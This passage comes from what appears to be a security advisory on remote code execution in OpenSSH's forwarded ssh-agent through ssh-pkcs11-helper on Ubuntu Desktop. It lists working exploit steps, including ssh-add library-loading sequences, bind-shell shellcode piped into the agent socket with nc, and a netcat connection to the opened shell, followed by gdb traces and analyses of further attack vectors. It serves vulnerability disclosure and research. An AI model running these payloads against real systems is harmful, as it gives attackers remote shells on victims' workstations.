------------------------------------------------------------------------

3d/ we remotely replace the unmapped SIGSEGV handler's code with another
piece of code (a useful gadget) from another shared library:

server# ssh-add -s /usr/lib/x86_64-linux-gnu/libKF5SonnetUi.so.5.92.0
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/x86_64-linux-gnu/libKF5SonnetUi.so.5.92.0": agent refused operation

------------------------------------------------------------------------

3e/ we remotely raise a SIGSEGV in ssh-pkcs11-helper:

server# ssh-add -s /usr/lib/x86_64-linux-gnu/libns3.35-wave.so.0.0.0
Enter passphrase for PKCS#11: whatever
[Press Ctrl-C after a few seconds.]

------------------------------------------------------------------------

3f/ the replacement code (gadget) is executed (instead of the unmapped
SIGSEGV handler's code) and jumps to the stack, into our shellcode,
which binds a shell on TCP port 31337 on Alice's workstation:

server# nc -v workstation 31337
Connection to workstation 31337 port [tcp/*] succeeded!

workstation$ id
uid=1000(alice) gid=1000(alice) groups=1000(alice),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),134(lxd),135(sambashare)

workstation$ ps axuf
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
...
alice       1105  0.0  0.1   7968  4192 ?        Ss   09:48   0:00 ssh-agent -s
alice       1249  0.0  0.0   2888   956 ?        S    10:03   0:00  \_ [sh]
alice       1268  0.0  0.0   7204  3092 ?        R    10:14   0:00      \_ ps axuf

------------------------------------------------------------------------

To get a clear view of the replacement code (the useful gadget) that is
executed instead of the unmapped SIGSEGV handler and that jumps into the
NOP sled of our shellcode (in the executable stack), we relaunch our
attack against ssh-agent and attach to ssh-pkcs11-helper with gdb:

workstation$ gdb /usr/lib/openssh/ssh-pkcs11-helper 1307
...
(gdb) continue
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x00007fb15c9b560e in std::_Rb_tree_decrement(std::_Rb_tree_node_base*) () from /lib/x86_64-linux-gnu/libstdc++.so.6

(gdb) stepi
0x00007fb15d0e1250 in ?? () from /lib/x86_64-linux-gnu/libQt5Widgets.so.5

(gdb) x/10i 0x00007fb15d0e1250
=> 0x7fb15d0e1250:      add    %rcx,%rdx
   0x7fb15d0e1253:      notrack jmp *%rdx
   ...

(gdb) stepi
0x00007fb15d0e1253 in ?? () from /lib/x86_64-linux-gnu/libQt5Widgets.so.5

(gdb) stepi
0x00007ffc2ec82691 in ?? ()

(gdb) x/10i 0x00007ffc2ec82691
=> 0x7ffc2ec82691:      nop
   0x7ffc2ec82692:      nop
   0x7ffc2ec82693:      nop
   0x7ffc2ec82694:      nop
   0x7ffc2ec82695:      nop
   0x7ffc2ec82696:      nop
   0x7ffc2ec82697:      nop
   0x7ffc2ec82698:      nop
   0x7ffc2ec82699:      nop
   0x7ffc2ec8269a:      nop

(gdb) !grep stack /proc/1307/maps
7ffc2ec66000-7ffc2ec87000 rwxp 00000000 00:00 0                          [stack]

========================================================================
Signal handler use-after-free (Ubuntu Desktop 21.10)
========================================================================

In this subsection, we present one of the various combinations of shared
libraries that result in a reliable, one-shot remote code execution in
ssh-agent on Ubuntu Desktop 21.10.

------------------------------------------------------------------------

1a/ On our local workstation, we install a default Ubuntu Desktop 21.10
(<https://na01.safelinks.protection.outlook.com/?url=https%3A%2F%2Fold-releases.ubuntu.com%2Freleases%2F21.10%2Fubuntu-21.10-desktop-amd64.iso&data=05%7C01%7C%7Ce12d96774c13433add7108db8875ffb9%7C84df9e7fe9f640afb435aaaaaaaaaaaa%7C1%7C0%7C638253812632612226%7CUnknown%7CTWFpbGZsb3d8eyJWIjoiMC4wLjAwMDAiLCJQIjoiV2luMzIiLCJBTiI6Ik1haWwiLCJXVCI6Mn0%3D%7C3000%7C%7C%7C&sdata=s6Y9CILGTxKnr0Ox53dA8v%2F2OblH63SBJOKvTb91jsE%3D&reserved=0><<https://old-releases.ubuntu.com/releases/21.10/ubuntu-21.10-desktop-amd64.iso>>),
without connecting this workstation to the Internet.

------------------------------------------------------------------------

1b/ After the installation is complete, we modify /etc/apt/sources.list
to prevent any package from being upgraded to a version that is not the
one that we used in our experiments:

workstation# cp -i /etc/apt/sources.list /etc/apt/sources.list.backup
workstation# echo 'deb <https://na01.safelinks.protection.outlook.com/?url=https%3A%2F%2Fold-releases.ubuntu.com%2Fubuntu%2F&data=05%7C01%7C%7Ce12d96774c13433add7108db8875ffb9%7C84df9e7fe9f640afb435aaaaaaaaaaaa%7C1%7C0%7C638253812632612226%7CUnknown%7CTWFpbGZsb3d8eyJWIjoiMC4wLjAwMDAiLCJQIjoiV2luMzIiLCJBTiI6Ik1haWwiLCJXVCI6Mn0%3D%7C3000%7C%7C%7C&sdata=M9UUStPZtnN1Zm6vzhcYoELovmTTib8juOO796aOFXE%3D&reserved=0><<https://old-releases.ubuntu.com/ubuntu/>> impish main restricted universe' > /etc/apt/sources.list

------------------------------------------------------------------------

1c/ We connect our workstation to the Internet, and install the three
packages (from Ubuntu's official "universe" repository) that contain the
three extra shared libraries used in this attack against ssh-agent:

workstation# apt-get update
workstation# apt-get upgrade
workstation# apt-get --no-install-recommends install syslinux-common
workstation# apt-get --no-install-recommends install libgnatcoll-postgres1
workstation# apt-get --no-install-recommends install libenca-dbg

------------------------------------------------------------------------

2/ As Alice, we run ssh-agent on our local workstation, connect to a
remote server with ssh, and enable ssh-agent forwarding with -A:

workstation$ id
uid=1000(alice) gid=1000(alice) groups=1000(alice),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),133(lxd),134(sambashare)

workstation$ eval `ssh-agent -s`
Agent pid 912

workstation$ echo /tmp/ssh-*/agent.*
/tmp/ssh-GnpGKph6xbe3/agent.911

workstation$ ssh -A server

server$ id
uid=1001(alice) gid=1001(alice) groups=1001(alice)

server$ echo /tmp/ssh-*/agent.*
/tmp/ssh-30N8pjTKWn/agent.996

------------------------------------------------------------------------

3/ Then, as a remote attacker who has access to this server:

------------------------------------------------------------------------

3a/ we remotely make ssh-agent's stack executable (more precisely,
ssh-pkcs11-helper's stack), via Alice's ssh-agent forwarding:

server# echo /tmp/ssh-*/agent.*
/tmp/ssh-30N8pjTKWn/agent.996

server# export SSH_AUTH_SOCK=/tmp/ssh-30N8pjTKWn/agent.996

server# ssh-add -s /usr/lib/syslinux/modules/efi64/gfxboot.c32
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/syslinux/modules/efi64/gfxboot.c32": agent refused operation

------------------------------------------------------------------------

3b/ we remotely store a shellcode in the stack of ssh-pkcs11-helper:

server# SHELLCODE=$'\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0\x4d\x31\xd2\x41\x52\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02\x7a\x69\x48\x89\xe6\x41\x50\x5f\x6a\x10\x5a\x6a\x31\x58\x0f\x05\x41\x50\x5f\x6a\x01\x5e\x6a\x32\x58\x0f\x05\x48\x89\xe6\x48\x31\xc9\xb1\x10\x51\x48\x89\xe2\x41\x50\x5f\x6a\x2b\x58\x0f\x05\x59\x4d\x31\xc9\x49\x89\xc1\x4c\x89\xcf\x48\x31\xf6\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05'

server# (perl -e 'print "\0\0\x27\xbf\x14\0\0\0\x10/usr/lib/modules\0\0\x27\xa6" . "\x90" x 10000'; echo -n "$SHELLCODE") | nc -U "$SSH_AUTH_SOCK"
[Press Ctrl-C after a few seconds.]

------------------------------------------------------------------------

3c/ we remotely alter the mmap layout of ssh-pkcs11-helper:

server# ssh-add -s /usr/lib/pulse-15.0+dfsg1/modules/module-remap-sink.so
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/pulse-15.0+dfsg1/modules/module-remap-sink.so": agent refused operation

------------------------------------------------------------------------

3d/ we remotely register a SIGBUS handler, and immediately munmap() its
code:

server# ssh-add -s /usr/lib/x86_64-linux-gnu/libgnatcoll_postgres.so.1
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/x86_64-linux-gnu/libgnatcoll_postgres.so.1": agent refused operation

------------------------------------------------------------------------

3e/ we remotely alter the mmap layout of ssh-pkcs11-helper (again), and
replace the unmapped SIGBUS handler's code with another piece of code (a
useful gadget) from another shared library:

server# ssh-add -s /usr/lib/pulse-15.0+dfsg1/modules/module-http-protocol-unix.so
server# ssh-add -s /usr/lib/x86_64-linux-gnu/sane/libsane-hp.so.1.0.32
server# ssh-add -s /usr/lib/libreoffice/program/libindex_data.so
server# ssh-add -s /usr/lib/x86_64-linux-gnu/gstreamer-1.0/libgstaudiorate.so
server# ssh-add -s /usr/lib/libreoffice/program/libscriptframe.so
server# ssh-add -s /usr/lib/x86_64-linux-gnu/libisccc-9.16.15-Ubuntu.so
server# ssh-add -s /usr/lib/x86_64-linux-gnu/libxkbregistry.so.0.0.0

------------------------------------------------------------------------

3f/ we remotely raise a SIGBUS in ssh-pkcs11-helper:

server# ssh-add -s /usr/lib/debug/.build-id/15/c0bee6bcb06fbf381d0e0e6c52f71e1d1bd694.debug
Enter passphrase for PKCS#11: whatever
[Press Ctrl-C after a few seconds.]

------------------------------------------------------------------------

3g/ the replacement code (gadget) is executed (instead of the unmapped
SIGBUS handler's code) and jumps to the stack, then into our shellcode,
which binds a shell on TCP port 31337 on Alice's workstation:

server# nc -v workstation 31337
Connection to workstation 31337 port [tcp/*] succeeded!

workstation$ id
uid=1000(alice) gid=1000(alice) groups=1000(alice),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),133(lxd),134(sambashare)

workstation$ ps axuf
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
...
alice        912  0.0  0.0   6060  2312 ?        Ss   17:18   0:00 ssh-agent -s
alice        928  0.0  0.0   2872   956 ?        S    17:25   0:00  \_ [sh]
alice        953  0.0  0.0   7060  3068 ?        R    17:40   0:00      \_ ps axuf

------------------------------------------------------------------------

To get a clear view of the replacement code (the useful gadget) that is
executed instead of the unmapped SIGBUS handler and that jumps into the
NOP sled of our shellcode (in the executable stack), we relaunch our
attack against ssh-agent and attach to ssh-pkcs11-helper with gdb:

workstation$ gdb /usr/lib/openssh/ssh-pkcs11-helper 1225
...
(gdb) continue
Continuing.

Program received signal SIGBUS, Bus error.
memset () at ../sysdeps/x86_64/multiarch/memset-vec-unaligned-erms.S:186

(gdb) stepi
0x00007f2ba9d7c350 in ?? () from /usr/lib/libreoffice/program/libuno_cppuhelpergcc3.so.3

(gdb) x/10i 0x00007f2ba9d7c350
=> 0x7f2ba9d7c350:      add    $0x28,%rsp
   0x7f2ba9d7c354:      mov    %r12,%rax
   0x7f2ba9d7c357:      pop    %rbx
   0x7f2ba9d7c358:      pop    %rbp
   0x7f2ba9d7c359:      pop    %r12
   0x7f2ba9d7c35b:      pop    %r13
   0x7f2ba9d7c35d:      pop    %r14
   0x7f2ba9d7c35f:      pop    %r15
   0x7f2ba9d7c361:      ret
   ...

(gdb) stepi
...
0x00007f2ba9d7c361 in ?? () from /usr/lib/libreoffice/program/libuno_cppuhelpergcc3.so.3

(gdb) stepi
0x00007fff7aae5e90 in ?? ()

(gdb) x/10i 0x00007fff7aae5e90
=> 0x7fff7aae5e90:      add    %dl,(%rax)
   0x7fff7aae5e92:      and    %eax,(%rax)
   0x7fff7aae5e94:      add    %al,(%rax)
   0x7fff7aae5e96:      add    %al,(%rax)
   0x7fff7aae5e98:      add    %ah,(%rax)
   0x7fff7aae5e9a:      and    %eax,(%rax)
   0x7fff7aae5e9c:      add    %al,(%rax)
   0x7fff7aae5e9e:      add    %al,(%rax)
   0x7fff7aae5ea0:      call   0x7fff7aae7fbe
   ...

(gdb) stepi
...
0x00007fff7aae5ea0 in ?? ()

(gdb) stepi
0x00007fff7aae7fbe in ?? ()

(gdb) x/10i 0x00007fff7aae7fbe
=> 0x7fff7aae7fbe:      nop
   0x7fff7aae7fbf:      nop
   0x7fff7aae7fc0:      nop
   0x7fff7aae7fc1:      nop
   0x7fff7aae7fc2:      nop
   0x7fff7aae7fc3:      nop
   0x7fff7aae7fc4:      nop
   0x7fff7aae7fc5:      nop
   0x7fff7aae7fc6:      nop
   0x7fff7aae7fc7:      nop

(gdb) !grep stack /proc/1225/maps
7fff7aacb000-7fff7aaeb000 rwxp 00000000 00:00 0                          [stack]

========================================================================
Callback function use-after-free
========================================================================

While analyzing the first results of our fuzzer, we noticed that some
combinations of shared libraries jump to the stack although they do not
register any signal handler or raise any signal; how is this possible?
On investigation, we understood that:

- a core library (for example, libgcrypt.so or libQt5Core.so) is loaded
  but not unloaded (munmap()ed) by dlclose(), because it is marked as
  "nodelete" by the loader;

- a shared library (for example, libgnunetutil.so or gammaray_probe.so)
  is loaded and registers a userland callback function with the core
  library (via gcry_set_allocation_handler() or qtHookData[], for
  example), but it does not deregister this callback function when
  dlclose()d (i.e., when its code is munmap()ed);

- another shared library is loaded (mmap()ed) and replaces the unmapped
  callback function's code with another piece of code (a useful gadget);

- yet another shared library is loaded and calls one of the core
  library's functions, which in turn calls the unmapped callback
  function and therefore executes the replacement code (the useful
  gadget) instead, thus jumping to the stack.

------------------------------------------------------------------------

In the following example, one of the core library's functions is called
at line 66254, the unmapped callback function is called at line 66288,
the replacement code (gadget) is executed instead at line 66289, and
jumps to the stack at line 66293 (ssh-pkcs11-helper segfaults here
because we did not make the stack executable):

Attaching to program: /usr/lib/openssh/ssh-pkcs11-helper, process 3628979
...
(gdb) record btrace
(gdb) continue
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x00007fff5000d9d0 in ?? ()

(gdb) !grep stack /proc/3628979/maps
7fff4fff3000-7fff50014000 rw-p 00000000 00:00 0                          [stack]

(gdb) set record instruction-history-size 100
(gdb) record instruction-history
...
66254      0x00007f9ae7d82df4:  call   0x7f9ae7d70180 <gcry_mpi_new@plt>
66255      0x00007f9ae7d70180 <gcry_mpi_new@...+0>:     endbr64
66256      0x00007f9ae7d70184 <gcry_mpi_new@...+4>:     bnd jmp *0x7aa9d(%rip)        # 0x7f9ae7deac28 <gcry_mpi_new@....plt>
66257      0x00007f9af801bbe0 <gcry_mpi_new+0>: endbr64
66258      0x00007f9af801bbe4 <gcry_mpi_new+4>: push   %r12
66259      0x00007f9af801bbe6 <gcry_mpi_new+6>: push   %rbx
66260      0x00007f9af801bbe7 <gcry_mpi_new+7>: lea    0x3f(%rdi),%ebx
66261      0x00007f9af801bbea <gcry_mpi_new+10>:        mov    $0x18,%edi
66262      0x00007f9af801bbef <gcry_mpi_new+15>:        shr    $0x6,%ebx
66263      0x00007f9af801bbf2 <gcry_mpi_new+18>:        sub    $0x8,%rsp
66264      0x00007f9af801bbf6 <gcry_mpi_new+22>:        call   0x7f9af801bb40
66265      0x00007f9af801bb40:  endbr64
...
66285      0x00007f9af809cc60:  mov    0xa8311(%rip),%rax        # 0x7f9af8144f78
66286      0x00007f9af809cc67:  test   %rax,%rax
66287      0x00007f9af809cc6a:  jne    0x7f9af809cc44
66288      0x00007f9af809cc44:  call   *%rax

66289      0x00007f9afc27edc0:  cmp    %eax,%ebx
66290      0x00007f9afc27edc2:  jne    0x7f9afc27f150
66291      0x00007f9afc27f150:  mov    %r14,%rsi
66292      0x00007f9afc27f153:  mov    %r13,%rdi
66293      0x00007f9afc27f156:  call   *%rbx

------------------------------------------------------------------------

In the following example, the unmapped callback function is called at
line 87352, the replacement code (gadget) is executed instead at line
87353, and jumps to the stack at line 87354:

Attaching to program: /usr/lib/openssh/ssh-pkcs11-helper, process 3628993
...
(gdb) record btrace
(gdb) continue
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x00007ffe4fc16d10 in ?? ()

(gdb) !grep stack /proc/3628993/maps
7ffe4fbfc000-7ffe4fc1d000 rw-p 00000000 00:00 0                          [stack]

(gdb) set record instruction-history-size 100
(gdb) record instruction-history
...
87347      0x00007f35f8972d26 <_ZN7QObjectC2ER14QObjectPrivatePS_+182>: lea    0x26acd3(%rip),%rax        # 0x7f35f8bdda00 <qtHookData>
87348      0x00007f35f8972d2d <_ZN7QObjectC2ER14QObjectPrivatePS_+189>: mov    0x18(%rax),%rax
87349      0x00007f35f8972d31 <_ZN7QObjectC2ER14QObjectPrivatePS_+193>: test   %rax,%rax
87350      0x00007f35f8972d34 <_ZN7QObjectC2ER14QObjectPrivatePS_+196>: jne    0x7f35f8972d88 <_ZN7QObjectC2ER14QObjectPrivatePS_+280>
87351      0x00007f35f8972d88 <_ZN7QObjectC2ER14QObjectPrivatePS_+280>: mov    %rbx,%rdi
87352      0x00007f35f8972d8b <_ZN7QObjectC2ER14QObjectPrivatePS_+283>: call   *%rax

87353      0x00007f35fa445130 <_ZN5KAuth15ObjectDecorator13setAuthActionERKNS_6ActionE+80>:     pop    %rbp
87354      0x00007f35fa445131 <_ZN5KAuth15ObjectDecorator13setAuthActionERKNS_6ActionE+81>:     ret

------------------------------------------------------------------------

Note: several shared libraries that are installed by default on Ubuntu
Desktop (for example, gkm-*-store-standalone.so) do not have constructor
or destructor functions, but they are actual PKCS#11 providers, so some
of their functions are explicitly called by ssh-pkcs11-helper, and these
functions register a callback function with libgcrypt.so but they do not
deregister it when dlclose()d (i.e., when munmap()ed), thus exhibiting
the "Callback function use-after-free" behavior presented in this
subsection.

In the following example, one of libgcrypt.so's functions is called at
line 79114, the unmapped callback function is called at line 79143, the
replacement code (gadget) is executed instead at line 79144, and jumps
to the stack at line 79157:

Attaching to program: /usr/lib/openssh/ssh-pkcs11-helper, process 3629085
...
(gdb) record btrace
(gdb) continue
Continuing.

Thread 1 "ssh-pkcs11-help" received signal SIGSEGV, Segmentation fault.
0x00007fffb2735c48 in ?? ()

(gdb) !grep stack /proc/3629085/maps
7fffb2716000-7fffb2737000 rw-p 00000000 00:00 0                          [stack]

(gdb) set record instruction-history-size 100
(gdb) record instruction-history
...
79114      0x00007f8328147e3a:  call   0x7f8328135500 <gcry_mpi_scan@plt>
79115      0x00007f8328135500 <gcry_mpi_scan@...+0>:    endbr64
79116      0x00007f8328135504 <gcry_mpi_scan@...+4>:    bnd jmp *0x7a8dd(%rip)        # 0x7f83281afde8 <gcry_mpi_scan@....plt>
79117      0x00007f832e2b1220 <gcry_mpi_scan+0>:        endbr64
79118      0x00007f832e2b1224 <gcry_mpi_scan+4>:        sub    $0x8,%rsp
79119      0x00007f832e2b1228 <gcry_mpi_scan+8>:        call   0x7f832e32fbb0
79120      0x00007f832e32fbb0:  endbr64
...
79140      0x00007f832e2b436e:  mov    0x129dc3(%rip),%rax        # 0x7f832e3de138
79141      0x00007f832e2b4375:  test   %rax,%rax
79142      0x00007f832e2b4378:  je     0x7f832e2b43b0
79143      0x00007f832e2b437a:  jmp    *%rax

79144      0x00007f832ed274f0:  and    $0x20,%al
79145      0x00007f832ed274f2:  mov    %rax,0x50(%rsp)
79146      0x00007f832ed274f7:  mov    0x30(%rsp),%r13d
79147      0x00007f832ed274fc:  mov    0x58(%rsp),%r15
79148      0x00007f832ed27501:  mov    %ebx,%ebp
79149      0x00007f832ed27503:  mov    %r8d,%edx
79150      0x00007f832ed27506:  mov    0x50(%rsp),%rsi
79151      0x00007f832ed2750b:  mov    0x28(%rsp),%r14
79152      0x00007f832ed27510:  movslq 0x38(%r12),%rax
79153      0x00007f832ed27515:  sub    $0x8000,%ebp
79154      0x00007f832ed2751b:  mov    0x54(%r12),%ecx
79155      0x00007f832ed27520:  add    %rax,%r14
79156      0x00007f832ed27523:  mov    %r14,%rdi
79157      0x00007f832ed27526:  call   *%r15

========================================================================
Return from syscall use-after-free
========================================================================

While analyzing the strace logs of the dlopen() and dlclose() of every
shared library in /usr/lib*, we spotted an unusual SIGSEGV:

- a shared library is loaded, and its constructor function starts a
  thread that sleeps for 10 seconds in kernel-land:

------------------------------------------------------------------------
3631347 openat(AT_FDCWD, "/usr/lib/x86_64-linux-gnu/cmpi/libcmpiOSBase_ProcessorProvider.so", O_RDONLY|O_CLOEXEC) = 3
...
3631347 mmap(NULL, 33296, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f5f3c3fb000
3631347 mmap(0x7f5f3c3fd000, 12288, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x2000) = 0x7f5f3c3fd000
3631347 mmap(0x7f5f3c400000, 8192, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x5000) = 0x7f5f3c400000
3631347 mmap(0x7f5f3c402000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x6000) = 0x7f5f3c402000
3631347 close(3)                        = 0
...
3631347 clone3({flags=CLONE_VM|CLONE_FS|CLONE_FILES|CLONE_SIGHAND|CLONE_THREAD|CLONE_SYSVSEM|CLONE_SETTLS|CLONE_PARENT_SETTID|CLONE_CHILD_CLEARTID, child_tid=0x7f5f3bd70910, parent_tid=0x7f5f3bd70910, exit_signal=0, stack=0x7f5f3b570000, stack_size=0x7fff00, tls=0x7f5f3bd70640} => {parent_tid=[3631372]}, 88) = 3631372
...
3631372 clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=10, tv_nsec=0},  <unfinished ...>
------------------------------------------------------------------------

- meanwhile, the main thread (ssh-pkcs11-helper) unloads this shared
  library (because it is not an actual PKCS#11 provider) and therefore
  munmap()s the code where the sleeping thread should return to after
  its sleep in kernel-land:

------------------------------------------------------------------------
3631347 socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 3
3631347 connect(3, {sa_family=AF_UNIX, sun_path="/dev/log"}, 110) = 0
3631347 sendto(3, "<35>Jun 22 18:35:25 ssh-pkcs11-helper[3631347]: error: dlsym(C_GetFunctionList) failed: /usr/lib/x86_64-linux-gnu/cmpi/libcmpiOSBase_ProcessorProvider.so: undefined symbol: C_GetFunctionList", 190, MSG_NOSIGNAL, NULL, 0) = 190
3631347 close(3)                        = 0
3631347 munmap(0x7f5f3c3fb000, 33296)   = 0
------------------------------------------------------------------------

- the sleeping thread returns from kernel-land and crashes with a
  SIGSEGV because its userland code (at 0x7f5f3c3fecff) was unmapped:

------------------------------------------------------------------------
3631372 <... clock_nanosleep resumed>0x7f5f3bd6fde0) = 0
3631372 --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x7f5f3c3fecff} ---
------------------------------------------------------------------------

Of course, we can request ssh-pkcs11-helper to load (mmap()) a
"nodelete" library before the sleeping thread returns from kernel-land,
thus replacing the unmapped userland code with another piece of code (a
hopefully useful gadget). In the following example, the sleeping thread
returns from kernel-land after line 214, executes the replacement code
(gadget) at line 256, and jumps to the stack at line 1305:

Attaching to program: /usr/lib/openssh/ssh-pkcs11-helper, process 3631531
...
(gdb) record btrace
(gdb) continue
Continuing.
...
Thread 2 "ssh-pkcs11-help" received signal SIGSEGV, Segmentation fault.
[Switching to Thread 0x7f4603960640 (LWP 3631561)]
0x00007ffe2196f180 in ?? ()

(gdb) !grep stack /proc/3631531/maps
7ffe21955000-7ffe21976000 rw-p 00000000 00:00 0                          [stack]

(gdb) set record instruction-history-size unlimited
(gdb) record instruction-history
...
214        0x00007f4604b71866 <__GI___clock_nanosleep+198>:     syscall
...
240        0x00007f4604b71831 <__GI___clock_nanosleep+145>:     ret
...
244        0x00007f4604b766ef <__GI___nanosleep+31>:    ret
...
255        0x00007f4604b7663d <__sleep+93>:     ret

256        0x00007f46050fecff:  jmp    0x7f4604662e54 <__ieee754_j1f128+2276>
257        0x00007f4604662e54 <__ieee754_j1f128+2276>:  movq   0x60(%rsp),%mm3
...
1304       0x00007f460466285b <__ieee754_j1f128+747>:   add    $0xc8,%rsp
1305       0x00007f4604662862 <__ieee754_j1f128+754>:   ret

========================================================================
Sigaltstack use-after-free
========================================================================

>From time to time, we noticed the following warning in the dmesg of our
fuzzing laptop:

------------------------------------------------------------------------
[585902.691238] signal: ssh-pkcs11-help[1663008] overflowed sigaltstack
------------------------------------------------------------------------

On investigation, we discovered that at least one shared library
(libgnatcoll_postgres.so) calls sigaltstack() to register an alternate
signal stack (used by SA_ONSTACK signal handlers) when dlopen()ed, and
then munmap()s this signal stack without deregistering it (SS_DISABLE)
when dlclose()d. Consequently, we implemented and tested a different
attack idea:

- we randomly load zero or more shared libraries that permanently alter
  the mmap layout;

- we load libgnatcoll_postgres.so, which registers an alternate signal
  stack and then munmap()s it without deregistering it;

- we randomly load zero or more shared libraries that alter the mmap
  layout (again), and hopefully replace the unmapped signal stack with
  another writable memory mapping (for example, a thread stack, or a
  .data or .bss segment);

- we randomly load one shared library that registers an SA_ONSTACK
  signal handler but does not munmap() its code when dlclose()d (unlike
  our original "Signal handler use-after-free" attack);

- we randomly load one shared library that raises this signal and
  therefore calls the SA_ONSTACK signal handler, thus overwriting the
  replacement memory mapping with stack frames from the signal handler;

- we randomly load one or more shared libraries that hopefully use the
  overwritten contents of the replacement memory mapping.

Although we successfully found various combinations of shared libraries
that overwrite a .data or .bss segment with a stack frame from a signal
handler, we failed to overwrite a useful memory mapping with useful data
(e.g., we failed to magically jump to the stack); for this attack to
work, more research and a finer-grained approach might be required.

========================================================================
Sigreturn to arbitrary instruction pointer
========================================================================

Astonishingly, numerous combinations of shared libraries crash because
they try to execute code at 0xcccccccccccccccc: a direct control of the
instruction pointer (RIP), because these 0xcc bytes come from the stack
buffer of ssh-pkcs11-helper that we (remote attackers) filled with 0xcc
bytes.

Initially, we got very excited by this new attack vector, because we
thought that a gadget of the form "add rsp, N; ret" was executed, thus
moving the stack pointer (RSP) into our 0xcc-filled stack buffer and
popping RIP from there. Unfortunately, the reality is more complex:

- a shared library raises a signal (a SIGSEGV in the example below, at
  line 134110) and, in consequence of a "Signal handler use-after-free",
  a replacement gadget of the form "ret N" is executed instead of the
  signal handler (at line 134111);

- exactly as the real signal handler would, the replacement gadget
  returns to the glibc's restore_rt() function (at line 134112), which
  in turn calls the kernel's rt_sigreturn() function (at line 134113);

- however, before the kernel's rt_sigreturn() function is called, the
  replacement gadget "ret N" moves RSP into our 0xcc-filled stack buffer
  and as a result, the kernel's rt_sigreturn() function restores all
  userland registers (including RIP and RSP) from there;

------------------------------------------------------------------------
Attaching to program: /usr/lib/openssh/ssh-pkcs11-helper, process 3633914
...
(gdb) record btrace
(gdb) continue
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x00007fcd468671b1 in xtables_register_target () from /lib/x86_64-linux-gnu/libxtables.so.12

(gdb) x/i 0x00007fcd468671b1
=> 0x7fcd468671b1 <xtables_register_target+209>:        movzbl 0x18(%rax),%eax

(gdb) info registers
rax            0x0                 0
...

(gdb) continue
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0xcccccccccccccccc in ?? ()

(gdb) set record instruction-history-size 100
(gdb) record instruction-history
...
134106     0x00007fcd4686719e <xtables_register_target+190>:    mov    0x6e1b(%rip),%rax        # 0x7fcd4686dfc0
134107     0x00007fcd468671a5 <xtables_register_target+197>:    movzwl 0x22(%rbx),%edx
134108     0x00007fcd468671a9 <xtables_register_target+201>:    mov    (%rax),%rax
134109     0x00007fcd468671ac <xtables_register_target+204>:    mov    %dx,0x6(%rsp)
134110  [disabled]
134111     0x00007fcd48e434a0:  ret    $0x1f0f
134112     0x00007fcd49655520 <__restore_rt+0>: mov    $0xf,%rax
134113     0x00007fcd49655527 <__restore_rt+7>: syscall

(gdb) info registers
rax            0x0                 0
rbx            0xcccccccccccccccc  -3689348814741910324
rcx            0xcccccccccccccccc  -3689348814741910324
rdx            0xcccccccccccccccc  -3689348814741910324
rsi            0xcccccccccccccccc  -3689348814741910324
rdi            0xcccccccccccccccc  -3689348814741910324
rbp            0xcccccccccccccccc  0xcccccccccccccccc
rsp            0xcccccccccccccccc  0xcccccccccccccccc
r8             0xcccccccccccccccc  -3689348814741910324
r9             0xcccccccccccccccc  -3689348814741910324
r10            0xcccccccccccccccc  -3689348814741910324
r11            0xcccccccccccccccc  -3689348814741910324
r12            0xcccccccccccccccc  -3689348814741910324
r13            0xcccccccccccccccc  -3689348814741910324
r14            0xcccccccccccccccc  -3689348814741910324
r15            0xcccccccccccccccc  -3689348814741910324
rip            0xcccccccccccccccc  0xcccccccccccccccc
------------------------------------------------------------------------

Although we directly control all of the userland registers, we failed to
transform this attack vector into a one-shot remote exploit, because RSP
(which was conveniently pointing into our 0xcc-filled stack buffer) gets
overwritten, and because we were unable to leak any information from
ssh-pkcs11-helper (to defeat ASLR).

Partially overwriting a pointer that is left over in ssh-pkcs11-helper's
stack buffer, and that is later used by rt_sigreturn() to restore a
userland register, might be an interesting idea that we have not
explored yet.

========================================================================
_Unwind_Context type-confusion
========================================================================

This attack vector was the most puzzling of our discoveries: from time
to time, some combinations of shared libraries jumped to the stack, but
evidently not as a result of a signal handler, callback function, or
return from syscall use-after-free. Eventually, we determined the
sequence of events that led to these stack jumps:

- some shared libraries load LLVM's libunwind.so as a "nodelete" library
  (i.e., it is never unloaded, even after dlclose());

- some shared libraries throw a C++ exception, which loads GCC's
  libgcc_s.so and calls the _Unwind_GetCFA() function (at line 57295 in
  the example below);

- however, GCC's libgcc_s.so mistakenly calls LLVM's _Unwind_GetCFA()
  (at line 57298) instead of GCC's _Unwind_GetCFA() (because LLVM's
  libunwind.so was loaded first), and passes a pointer to GCC's struct
  _Unwind_Context to this function (instead of a pointer to LLVM's
  struct _Unwind_Context, which is a different type of structure);

